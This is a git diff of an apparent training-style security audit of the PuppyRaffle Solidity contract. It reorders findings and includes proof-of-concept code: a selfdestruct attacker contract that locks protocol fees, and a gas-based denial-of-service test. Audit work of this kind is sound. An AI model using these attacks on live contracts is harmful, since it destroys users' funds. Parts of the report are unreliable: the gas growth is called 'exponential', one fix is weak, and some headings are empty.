@@ -74,126 +74,8 @@ Adhere to the CEI , Checks Effects Interaction.
 
 The Effects should come before any external calls.
 
-### [H-2] Protocol Can lose all protocol fee funds in the contract forever.
 
-**Description:**
-In the `PuffyRaffle::withdrawFees` function , the check for the balance to be equal to the `totalFees` in the contract will always fail if additional `ETH` is sent to the contract. Although the function does not have a `fallback` function to receive funds. An attacker could create a contract with `ETH` and call a `selfdestruct` which will push`ETH` to the contract. Thereby causing the protocol to lose the funds in the contract.
-
-**Impact:**
-All protocol fees will be lost forever.
-
-**Proof of Concept:**
-
-<details>
-
-<summary>Code</summary>
-
-```solidity
-///@notice attacker contract
-contract AttackerContract {
-function attack(address victim) external payable {
-    selfdestruct(payable(victim));
-}
-
-fallback() external payable {}
-
-}
-
-function testWithdrawShouldFailedWhenBalanceIsGreaterThanTotalFees() public playersEntered {
-    vm.warp(block.timestamp + duration + 1);
-    vm.roll(block.number + 1);
-
-    puppyRaffle.selectWinner();
-
-    //attack
-    AttackerContract attackerCon = new AttackerContract();
-
-    //send funds to attacker contract
-    vm.deal(address(attackerCon), 3 ether);
-
-    attackerCon.attack(address(puppyRaffle));
-
-    vm.expectRevert("PuppyRaffle: There are currently players active!");
-        puppyRaffle.withdrawFees();
-}
-```
-
-</details>
-
-**Recommended Mitigation:** Change the require check.
-
-```diff
-- require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
-
-+ require(totalFees != 0, "PuppyRaffle: Not enough fees!");
-```
-
-### [H-3] Denial of Service attack on the `PuffyRaffle::enterRaffle` function, which increases the amount of gas exponentially as `players` increases.
-
-**Description:**
-In the `PuffyRaffle::enterRaffle` function, the gas cost increases exponentially as the number of players increases. This is because the function loops through the `players` array which could be is an expensive operation. An attacker could create a contract that calls the `enterRaffle` function with a large number of players which will cause the function to run out of gas.
-
-**Impact:**
-The function will run out of gas and there denying users from using the protocol.
-
-**Proof of Concept:**   Add this to the test suite:
-
-<details>
-<summary>POC</summary>
-
-```solidity
-function testDOS_Attack() public {
-    uint256 firstPlayers = 10;
-
-    //first 10 players
-    address[] memory players = new address[](firstPlayers);
-    for (uint256 i = 0; i < firstPlayers; i++) {
-        players[i] = address(uint160(i));
-    }
-
-    uint256 gasLeftBefore = gasleft();
-
-    puppyRaffle.enterRaffle{value: firstPlayers * entranceFee}(players);
-
-    uint256 gasLeftAfter = gasleft();
-
-    console.log("Gas Diff", gasLeftBefore - gasLeftAfter);
-
-    uint256 secondPlayers = 100;
-
-    ///second 100 players
-    address[] memory second_players = new address[](secondPlayers);
-    for (uint256 i = 0; i < secondPlayers; i++) {
-        second_players[i] = address(uint160(secondPlayers + i));
-    }
-
-    uint256 gasLeftBeforeTwo = gasleft();
-
-    puppyRaffle.enterRaffle{value: secondPlayers * entranceFee}(
-        second_players
-    );
-
-    uint256 gasLeftAfterTwo = gasleft();
-
-    console.log("Gas Diff", (gasLeftBeforeTwo - gasLeftAfterTwo));
-    }
-```
-
-Output : We can see the gas cost increases exponentially as the number of players increases.
-
-```javascript
-Gas Diff 286208
-Gas Diff 7070955
-```
-
-</details>
-
-**Recommended Mitigation**
-There are multiple ways to mitigate this:
-* Protocol could add a cap to the number of players that can participate in the raffle.
-* 
-
-### [M-1] Weak Randomness in the `PuffyRaffle::selectWinner` function, which can be manipulated by miners.
+### [H-2] Weak Randomness in the `PuffyRaffle::selectWinner` function, which can be manipulated by miners.
 **Description:**
 In the `PuffyRaffle::selectWinner` function, the randomness is generated using the `(msg.sender, block.timestamp, block.difficulty)`. This is a weak source of randomness as miners can manipulate the block.timestamp and block.difficulty to predict the randomness. This can be done by miners who have control over the block.timestamp and block.difficulty.
 
@@ -276,7 +158,133 @@ function testGameProtocol() public {
 **Recommended Mitigation:**
 Use Chainlink VRF or other secure sources of randomness.
 
-### [M-1] UnSafeCasting of `fees` to uint64 , causes overflow hence reducing the value of `totalFees`.
+### [H-3] Overflow High Issue
+
+### [H-4] Malicious Winner
+
+### [M-1] Denial of Service attack on the `PuffyRaffle::enterRaffle` function, which increases the amount of gas exponentially as `players` increases.
+
+**Description:**
+In the `PuffyRaffle::enterRaffle` function, the gas cost increases exponentially as the number of players increases. This is because the function loops through the `players` array which could be is an expensive operation. An attacker could create a contract that calls the `enterRaffle` function with a large number of players which will cause the function to run out of gas.
+
+**Impact:**
+The function will run out of gas and there denying users from using the protocol.
+
+**Proof of Concept:**   Add this to the test suite:
+
+<details>
+<summary>POC</summary>
+
+```solidity
+function testDOS_Attack() public {
+    uint256 firstPlayers = 10;
+
+    //first 10 players
+    address[] memory players = new address[](firstPlayers);
+    for (uint256 i = 0; i < firstPlayers; i++) {
+        players[i] = address(uint160(i));
+    }
+
+    uint256 gasLeftBefore = gasleft();
+
+    puppyRaffle.enterRaffle{value: firstPlayers * entranceFee}(players);
+
+    uint256 gasLeftAfter = gasleft();
+
+    console.log("Gas Diff", gasLeftBefore - gasLeftAfter);
+
+    uint256 secondPlayers = 100;
+
+    ///second 100 players
+    address[] memory second_players = new address[](secondPlayers);
+    for (uint256 i = 0; i < secondPlayers; i++) {
+        second_players[i] = address(uint160(secondPlayers + i));
+    }
+
+    uint256 gasLeftBeforeTwo = gasleft();
+
+    puppyRaffle.enterRaffle{value: secondPlayers * entranceFee}(
+        second_players
+    );
+
+    uint256 gasLeftAfterTwo = gasleft();
+
+    console.log("Gas Diff", (gasLeftBeforeTwo - gasLeftAfterTwo));
+    }
+```
+
+Output : We can see the gas cost increases exponentially as the number of players increases.
+
+```javascript
+Gas Diff 286208
+Gas Diff 7070955
+```
+
+</details>
+
+**Recommended Mitigation**
+There are multiple ways to mitigate this:
+* Protocol could add a cap to the number of players that can participate in the raffle.
+* 
+
+
+
+### [M-2] Protocol Can lose all protocol fee funds in the contract forever.
+
+**Description:**
+In the `PuffyRaffle::withdrawFees` function , the check for the balance to be equal to the `totalFees` in the contract will always fail if additional `ETH` is sent to the contract. Although the function does not have a `fallback` function to receive funds. An attacker could create a contract with `ETH` and call a `selfdestruct` which will push`ETH` to the contract. Thereby causing the protocol to lose the funds in the contract.
+
+**Impact:**
+All protocol fees will be lost forever.
+
+**Proof of Concept:**
+
+<details>
+
+<summary>Code</summary>
+
+```solidity
+///@notice attacker contract
+contract AttackerContract {
+function attack(address victim) external payable {
+    selfdestruct(payable(victim));
+}
+
+fallback() external payable {}
+
+}
+
+function testWithdrawShouldFailedWhenBalanceIsGreaterThanTotalFees() public playersEntered {
+    vm.warp(block.timestamp + duration + 1);
+    vm.roll(block.number + 1);
+
+    puppyRaffle.selectWinner();
+
+    //attack
+    AttackerContract attackerCon = new AttackerContract();
+
+    //send funds to attacker contract
+    vm.deal(address(attackerCon), 3 ether);
+
+    attackerCon.attack(address(puppyRaffle));
+
+    vm.expectRevert("PuppyRaffle: There are currently players active!");
+        puppyRaffle.withdrawFees();
+}
+```
+
+</details>
+
+**Recommended Mitigation:** Change the require check.
+
+```diff
+- require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
+
++ require(totalFees != 0, "PuppyRaffle: Not enough fees!");
+```
+
+
+### [M-3] UnSafeCasting of `fees` to uint64 , causes overflow hence reducing the value of `totalFees`.
 
 **Description**
 The casting the fees to uint64 can overflow  `totalFees = totalFees + uint64(fee);`, when the value of fees increases. since a uint64 can only take up to 18.4..e18 values. so any value that goes beyond gets wrapped around. 
@@ -320,6 +328,8 @@ There multiple ways to mitigate this issue:
 
 * Use newer versions of solidity , since the compiler wont allow this `totalFees = totalFees + uint64(fee);` to compile.
 * Use use OpenZeppelin's SafeCast to safely cast the fees.
+
+
 
 
 
@@ -404,3 +414,42 @@ uint256 totalAmountCollected = players.length * entranceFee;
 - uint256 totalAmountCollected = players.length * entranceFee;
 + uint256 totalAmountCollected = address(this).balance;
 ```
+
+### [NC-5] Unused code should be removed, to reduce contract code size.
+
+**Proof of Concept**
+
+```javascript
+ function _isActivePlayer() internal view returns (bool) {
+    for (uint256 i = 0; i < players.length; i++) {
+        if (players[i] == msg.sender) {
+                return true;
+        }
+    }
+    return false;
+ }
+```
+
+**Recommended Mitigation:**
+Remove the unused code.
+
+
+### [NC-6] Use Events to log important contract state changes.
+
+**Description:**
+Events are a way to log important contract state changes. They are useful for dApps to listen to these events and update the UI accordingly. `PuppyRaffle::withdrawFees` and `PuppyRaffle::selectWinner` functions do not emit any events.
+
+**Recommended Mitigation:**
+Add events to log important contract state changes.
+
+
+### [NC-7] Events parameters should be indexed, to make it easier to filter events.
+
+**Description:**
+Events parameters should be indexed, to make it easier to filter events. `PuppyRaffle::enterRaffle`,`PuppyRaffle::refund` and `PuppyRaffle::changeFeeAddress` event does not have any indexed parameters.
+
+**Recommended Mitigation:**
+Add indexed parameters to the events.
+
+
+### [NC-8] erroneous 'getActivePlayerIndex' function
